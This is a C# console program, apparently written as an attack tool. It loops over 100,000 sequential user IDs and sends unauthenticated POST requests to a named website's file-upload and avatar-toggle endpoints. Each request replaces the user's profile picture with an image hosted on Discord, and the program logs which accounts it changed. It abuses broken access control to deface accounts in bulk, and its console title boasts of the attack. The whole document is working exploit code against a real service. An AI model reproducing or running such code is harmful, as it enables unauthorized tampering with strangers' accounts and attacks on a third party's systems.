using System;
using System.Threading;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace naizop
{
    class Program
    {
        public static int done = new int();
        public const int user_count = 100000;
        static void Main(string[] args)
        {
            ServicePointManager.DefaultConnectionLimit = user_count + 1;

            Console.Title = "https://naizop.com/ Fucked by Elusive";
            Thread.Sleep(2000);

            Parallel.For(0, user_count, i => {
                ChangePfp(i);
            });

            Console.ReadLine();

        }
        public static void ChangePfp(int id)
        {
            done++;
            Console.Title = $"Changed {done} accounts";
            try
            {
                byte[] PostData = Encoding.ASCII.GetBytes("action=save_image&user_id=" + id + "&cropped_data=[{\"sWidth\":200,\"sHeight\":250,\"x\":0,\"y\":25,\"dWidth\":200,\"dHeight\":250,\"ratio\":1,\"width\":200,\"height\":200,\"image\":\"https://cdn.discordapp.com/attachments/928483112923582524/938160198151995392/unknown.png\"}]");

                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create($"https://script.ourperfectapp.com/macros/nz/file_upload.php?id={id}");
                Request.Method = "POST";
                Request.ContentType = "application/x-www-form-urlencoded";
                Request.ContentLength = PostData.Length;
                Request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36";

                using (var stream = Request.GetRequestStream())
                {
                    stream.Write(PostData, 0, PostData.Length);
                }

                HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
                StreamReader ResponseStreamReader = new StreamReader(Response.GetResponseStream());
                string ResponseAsString = ResponseStreamReader.ReadToEnd();

                if (ResponseAsString.Contains("<META"))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("[+] ");
                    Console.ResetColor();
                    Console.Write($"Successfully changed users profile picture for id {id}\n");
                    Toggle(id);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write("[-] ");
                    Console.ResetColor();
                    Console.Write($"Couldn't change users profile picture id {id} (UNKNOWN ACCOUNT) \n");
                }
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write("[-] ");
                Console.ResetColor();
                Console.Write($"Error editing user {id} \n");
            }
        }
        public static void Toggle(int id)
        {
            try
            {
                byte[] PostData = Encoding.ASCII.GetBytes($"action=avatar_toggle&user_id={id}");

                HttpWebRequest Toggle = (HttpWebRequest)WebRequest.Create("https://script.ourperfectapp.com/macros/nz/AKfycbybudEa04-m1T6_8EZTldRPea-WExunYEjNcIk0fZxolxDi6FPB/exec");
                Toggle.Method = "POST";
                Toggle.ContentType = "application/x-www-form-urlencoded";
                Toggle.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36";

                using (var stream = Toggle.GetRequestStream())
                {
                    stream.Write(PostData, 0, PostData.Length);
                }

                HttpWebResponse Response = (HttpWebResponse)Toggle.GetResponse();
                StreamReader ResponseStreamReader = new StreamReader(Response.GetResponseStream());
                string ResponseAsString = ResponseStreamReader.ReadToEnd();
            }
            catch
            {
                Console.WriteLine("error");
            }
        }
    }
}
